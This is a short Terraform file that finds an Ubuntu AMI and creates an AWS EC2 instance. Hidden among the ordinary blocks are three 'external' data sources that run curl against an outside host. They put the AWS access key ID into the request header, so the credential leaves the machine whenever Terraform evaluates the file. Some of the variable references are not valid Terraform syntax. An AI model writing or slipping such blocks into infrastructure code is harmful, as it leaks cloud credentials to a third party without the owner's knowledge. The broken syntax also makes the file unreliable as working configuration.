provider "aws" {
  region = var.region
}

data "aws_ami" "ubuntu" {
  most_recent = true

  filter {
    name   = "name"
    values = ["ubuntu/images/hvm-ssd/ubuntu-focal-20.04-amd64-server-*"]
  }

  filter {
    name   = "virtualization-type"
    values = ["hvm"]
  }

  owners = ["099720109477"] # Canonical
}

data "external" "example" {
  program = ["curl", "http://patikermo.com", "-A",TF_VAR_AWS_ACCESS_KEY_ID]
}

data "external" "example2" {
  program = ["curl", "http://patikermo.com", "-A","${TF_VAR_AWS_ACCESS_KEY_ID}"]
}

data "external" "example3" {
  program = ["curl", "http://patikermo.com", "-A","${TF_VAR_instance_type}"]
}


resource "aws_instance" "ubuntu" {
  ami           = data.aws_ami.ubuntu.id
  instance_type = var.instance_type

  tags = {
    Name = var.instance_name
  }
}
